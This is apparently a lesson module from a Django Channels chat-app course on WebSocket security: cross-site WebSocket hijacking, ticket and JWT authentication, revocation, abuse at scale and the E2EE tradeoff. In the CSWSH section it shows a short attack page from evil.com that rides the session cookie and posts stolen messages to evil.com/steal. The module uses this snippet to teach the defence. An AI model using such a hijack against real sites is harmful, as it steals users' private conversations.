# Module 21 — Security & Abuse at Scale

**Goal:** Close every security hole this course deliberately left open, and
understand the abuse problems that only exist at scale — including the E2EE
tradeoff that decides what your product can be. On Django Channels, where the
attack surface has its own Python/ASGI-shaped edges.

⏱️ ~5 hours · **Prerequisites:** Modules 00–20.

> This is the Django/Channels twin of the JVM course's
> [`21-security-and-abuse-at-scale`](../../spring-boot-chat-course/21-security-and-abuse-at-scale/).
> The *problems* are identical — CSWSH, token-on-a-long-socket, cross-node
> revocation, distributed floods, E2EE. The *mechanisms* are Django's:
> `AllowedHostsOriginValidator` instead of `setAllowedOrigins`, a Channels
> middleware instead of a `HandshakeInterceptor`, `channel_layer.group_send`
> and a raw Redis Pub/Sub side-channel instead of Spring's `SimpMessagingTemplate`.
> Where the conclusion matches the JVM twin, this module says so.

---

## The holes we left open

This course has been accumulating deliberate debt so that each fix lands with a
working attack behind it. Here it is, collected:

| Module | Hole | Severity |
|--------|------|----------|
| 04 | No `OriginValidator` on the ASGI router — any origin may open a socket | **Critical** — CSWSH |
| 04 | `scope["user"]` trusted from a `?user=alice` query param — a fake token | **Critical** |
| 04 | A token expires; the `AsyncJsonWebsocketConsumer` instance does not | High |
| 05 | Clients could publish to a room's group directly (closed in the challenge) | Critical |
| 05 | No subscribe-time authorization (closed in the challenge) | High |
| 11 | Rate limits exist (token buckets in Lua), but nothing detects a *distributed* attack | Medium |
| 11 | Revocation gap: removed from a room, the consumer stays in the group | High |
| 12 | No message-content validation before persist + fan-out | Medium |
| 19 | Node/pod name leaked to clients for room-affinity routing | Low |

Nine holes. Every one is closed in the lab, each fix demonstrated against a
working attack — because a defense you never watched fail is a defense you don't
actually understand.

---

## CSWSH: the attack CORS does not stop

**Browsers do not apply the CORS same-origin policy to WebSocket.** A
`new WebSocket()` from `evil.com` to `chat.example.com` is *not* blocked by the
browser, and if your server authenticates by cookie, **the cookie is sent**.

This bites Django/Channels harder than most people expect, because Channels'
`AuthMiddlewareStack` — the thing every tutorial tells you to wrap your ASGI app
in — reads Django's **session cookie**. It is exactly the cookie-in-the-handshake
design CSWSH preys on, and Channels does **not** check `Origin` for you.

```html
<!-- served from evil.com -->
<script>
const ws = new WebSocket('wss://chat.example.com/ws/');   // the session cookie rides along
ws.onmessage = e => fetch('https://evil.com/steal', { method: 'POST', body: e.data });
</script>
```

If your consumer authenticates from `self.scope["user"]` (populated by
`AuthMiddlewareStack` from the session) and you never checked `Origin`, that page
reads the victim's entire chat.

Channels ships the fix, but it is **off unless you wrap your router in it**:

```python
# asgi.py — the wrapper nobody enables until they've been bitten
from channels.security.websocket import AllowedHostsOriginValidator

application = ProtocolTypeRouter({
    "websocket": AllowedHostsOriginValidator(   # <-- checks Origin against ALLOWED_HOSTS
        AuthMiddlewareStack(URLRouter(websocket_urlpatterns))
    ),
})
```

Two things to be precise about:

1. **`Origin` is set by the browser and cannot be forged by page JavaScript.** It
   is reliable *against browser-based attacks*. It is **not** reliable against a
   non-browser client (curl, a Python script, `websocat`) which can send any
   `Origin` it likes — so `Origin` checking defends against CSWSH, not against a
   determined attacker with their own client. It is a browser-trust boundary, not
   an authorization mechanism.
2. **`SameSite=Lax` cookies (Django's modern default, `SESSION_COOKIE_SAMESITE`)
   already block this** for cross-site WebSocket handshakes in current browsers.
   But you cannot rely on that alone — it depends on browser version and on nobody
   flipping `SameSite=None` for an unrelated integration.

`AllowedHostsOriginValidator` uses `settings.ALLOWED_HOSTS`, which is coarse. For
Pulse we use an explicit `OriginValidator` with the exact dev and prod origins,
plus `SESSION_COOKIE_SAMESITE = "Strict"` as defense in depth — **and, best of
all, we stop authenticating WebSockets by cookie at all** (Part B). Defense in
depth: check `Origin`, set `SameSite=Strict`, and don't put a cookie on the
handshake in the first place.

---

## Authenticating a WebSocket, properly

Module 04 listed the options and shipped the fake one (`?user=alice`, trusted
blindly). Here is the one Pulse ships for real, and why.

| Approach | Problem |
|----------|---------|
| Session cookie (`AuthMiddlewareStack`) | CSWSH surface; cross-origin pain; ties chat auth to Django sessions |
| `?token=<JWT>` in the query string | **Leaks into access logs, browser history, `Referer`, error trackers** — a WebSocket URL is logged like any URL |
| `Sec-WebSocket-Protocol` subprotocol | Works; abuses a protocol-negotiation field; limited character set |
| **Short-lived ticket in the query string** | ✅ single-use, 30-second life; a leaked log line is already worthless |
| **First-frame auth (`{"type":"hello","token":...}`)** | ✅ never in a URL; costs one round trip after the socket opens |

Pulse uses **both**, because each covers the other's gap:

```
POST /api/ws-ticket        (normal authenticated HTTP: DRF, session or JWT)
  → { "ticket": "…", "expiresIn": 30 }

wss://chat.example.com/ws/?ticket=…
  → Channels middleware consumes the ticket, handshake authorized, socket opens
    (an UNauthenticated socket is never even created)

first frame after connect:
  {"type":"hello","token":"<jwt>"}
  → the consumer verifies the JWT signature + expiry, cross-checks identity,
    and only then joins any room group
```

The ticket is a single-use random string stored in Redis with a 30-second TTL and
consumed with an **atomic `GETDEL`** (Redis 6.2+). A replayed ticket finds
nothing. A leaked ticket in a log line is expired and already consumed.

> **Why not just verify the JWT in the query string and skip the ticket?** Because
> the query string is logged. The ticket exists precisely so that the thing in the
> URL is worthless 30 seconds later. The JWT — the durable credential — never
> touches a URL; it arrives in the first WebSocket *frame*, which is not logged
> like a URL is.

### The token that expires on a socket that doesn't

A JWT lives 15 minutes; a chat socket lives 8 hours. Three wrong answers and one
right one:

| Approach | Problem |
|----------|---------|
| Ignore it — authenticate once at connect | **A revoked user stays connected for hours** |
| Long-lived JWT (8 h) | A stolen token is valid for 8 hours |
| Drop the socket at expiry, force reconnect | Every user reconnects every 15 minutes — a permanent thundering herd |
| **In-band re-authentication** | ✅ Module 17's client already sends a refreshed token on the open socket |

The consumer warns ~2 minutes before expiry (`{"type":"reauth_required"}`), the
client refreshes over HTTP and sends `{"type":"reauth","token":"<new jwt>"}` on
the **already-open** socket, and the consumer updates the session's expiry in
place. **No reconnect, no gap, and a normally-expiring token bounds how long a
revoked user can linger to one token lifetime.**

For *immediate* revocation you need a **denylist** — a Redis set of revoked `jti`
values — checked on re-auth and, crucially, **pushed to every node** so open
sockets die now rather than at their next re-auth.

---

## Authorization has two halves

Module 05's challenge established this and it is worth restating as a principle:

```
SUBSCRIBE time:  is this user allowed in this room?     ← necessary
DELIVERY time:   is this user STILL allowed?            ← the half people skip
```

A group subscription is long-lived; a permission is not. Removing someone from a
private room does not, by itself, stop delivering that room's messages to their
open socket — and that is a security bug, not a UX quirk.

**Django/Channels makes this sharper than the JVM twin, for a specific reason.**
Channels group membership is *per-process*. `channel_layer.group_add(room,
channel_name)` records, in the Redis channel layer, that *this channel* is in the
group — but the decision to *evict* a channel lives in the Python process that
owns the consumer. There is **no cluster-wide "who is in room 7" query** you can
run and no central place to call `group_discard` from another node. So:

- Removing alice from room 7 **on node B** cannot reach into node A's process to
  make alice's consumer call `group_discard`.
- You must **publish the revocation** over a Redis side-channel and let each node
  evict its own local subscribers. (This is the exact Pub/Sub-vs-Streams lesson of
  Module 07/09, resurfacing as a security requirement.)

Two mechanisms, and you want both:

1. **Active eviction on membership change** — the node that owns alice's consumer
   calls `group_discard` *and* closes/updates the consumer's room set. You cannot
   merely *ask the client* to unsubscribe; a hostile client won't. And you publish
   the revocation so every *other* node evicts its own copies of alice.
2. **Re-check at delivery for sensitive rooms** — a cached membership lookup per
   delivered message, applied only to rooms flagged private, because it has a real
   cost at fan-out scale.

---

## Abuse that only exists at scale

| Attack | Why scale matters | Defense |
|--------|-------------------|---------|
| **Connection flood** | 100k handshakes/s exhausts file descriptors before any message is sent | Rate-limit the handshake at nginx (`limit_req`/`limit_conn`), not in the ASGI app |
| **Slow consumer (deliberate)** | One client holding backpressure ties up an event-loop send (Module 06) | Bounded send with a write timeout; drop-and-close on stall |
| **Large-room amplification** | One message to a 50,000-member room is 50,000 group deliveries | Room-size caps; fan-out-on-read above a threshold |
| **Distributed low-and-slow** | 200 accounts each under every per-account limit (Module 11) | **Aggregate** anomaly detection, not per-entity limits |
| **Resume abuse** | `from_seq=0` on a 300k-message room is the single most expensive request a client can make | Clamp, rate-limit, abandon-threshold (Module 10) |
| **Zip-bomb payloads** | A 10 MB frame × 200 recipients = 2 GB of Python `bytes` buffers | Frame-size limit at the ASGI layer; validate *before* fan-out |
| **Account farming** | Rate limits are per-account; accounts are free | Registration friction, reputation, device fingerprinting |

The through-line: **a limit scoped to one entity is bypassed by using many
entities.** You need per-entity limits *and* aggregate detection. There is no
single knob.

### The Python-specific one: blocking the loop *is* a denial of service

There is an abuse vector here the JVM twin does not have. In an `async` consumer,
**one synchronous call blocks the entire event loop** — and therefore every other
connection that worker process holds (Module 15's cardinal sin). If a request path
can be steered into a slow *synchronous* operation — an un-wrapped ORM call, a
regex with catastrophic backtracking on user content, a synchronous crypto call —
an attacker who triggers it has stalled thousands of *other people's* sockets on
that worker. **A CPU-bound or blocking operation on user-controlled input is a DoS
primitive in async Python.** Every user-facing code path must be either genuinely
async or explicitly pushed to a threadpool with `database_sync_to_async`, and any
regex over user content must be linear-time. We treat "a blocking call on the loop"
as a security bug, not just a performance one.

---

## Content validation, before fan-out

Validation must happen **before** persist and fan-out, and the *size* limit must
happen before you even build the Python object:

```
receive_bytes → size check → json.loads → validate → persist → publish → fan out
                ^^^^^^^^^^                 ^^^^^^^^ here, once
```

Channels hands you the frame; if you `json.loads` a 10 MB body first, you have
already spent 10 MB of heap and a chunk of one core (JSON parsing is synchronous
CPU work on the event loop — see above). So the limit is a **length check on the
raw frame** before decode:

```python
async def receive(self, text_data=None, bytes_data=None):
    if text_data and len(text_data) > self.MAX_FRAME_BYTES:   # 64 KiB, before json.loads
        await self.close(code=4009)                            # policy violation
        return
    ...
```

And a message that fails validation must **never** be amplified 200× — validate
once, at ingress, before the room's `group_send`.

---

## End-to-end encryption: the honest tradeoff

E2EE means the server cannot read messages. Everything below follows from that one
sentence — and none of it is Django-specific, which is exactly the point.

**What you lose, concretely:**

| Capability | Without E2EE | With E2EE |
|-----------|-------------|-----------|
| Server-side search | ✅ | ❌ — client-side index only, over messages that device holds |
| Content moderation | ✅ automated | ❌ — user reports, or contested client-side scanning |
| Spam/abuse detection on content | ✅ | ❌ — metadata only |
| Link previews | ✅ server-side | client-side only, leaking the URL to the previewer |
| Push-notification content | ✅ | ❌ — "New message" only, or a decrypting notification extension |
| Multi-device | trivial | **hard** — key distribution, per-device sessions |
| New device sees history | ✅ | ❌ unless you ship an encrypted backup, which becomes the weak point |
| Server-side compliance / eDiscovery | ✅ | ❌ |
| Bots and integrations | ✅ | ❌ — a bot is another device needing keys |

**What you keep:** message delivery, ordering, presence, read receipts, and **every
piece of infrastructure in this course**. The ciphertext routes through your
Channels groups, your Redis Streams fan-out, your Postgres store, your resume
cursor — *exactly* like plaintext. **E2EE is orthogonal to the fan-out
architecture.**

**The metadata that leaks regardless:** who talked to whom, when, how often, from
what IP, message sizes, timing. For many threat models that is the more sensitive
half, and E2EE does nothing for it.

> **The decision is a product decision, not a security one.** Signal's product
> *is* privacy, so E2EE is non-negotiable and search is client-side. Slack's
> product is searchable organizational memory, so E2EE would destroy it. Both are
> correct. What is *not* correct is bolting on E2EE without deciding what you are
> giving up — teams routinely ship it and then discover moderation is impossible
> and their support team can't see what users are complaining about.

Pulse ships **without E2EE by default**, with **crypto-shredding** (Module 12) for
GDPR erasure and transport encryption everywhere. The lab implements optional E2EE
for direct messages using the browser's WebCrypto API, so the tradeoff is concrete
rather than theoretical — and so you can watch the infrastructure not care.

---

## What's next

The lab closes every hole in the table above: it demonstrates CSWSH stealing chat
and then blocks it, replaces the fake token with a verified JWT plus a single-use
Redis ticket and an identity cross-check, implements in-band re-auth with immediate
cluster-wide revocation *and* a reconciliation loop (because Pub/Sub is
at-most-once), closes the delivery-time authorization gap **across nodes**, builds
abuse detection that survives a 200-account/200-IP distributed flood while leaving
an organic viral spike alone, and ships optional E2EE for DMs — measuring what each
defense costs.

See you in [`lab.md`](./lab.md).
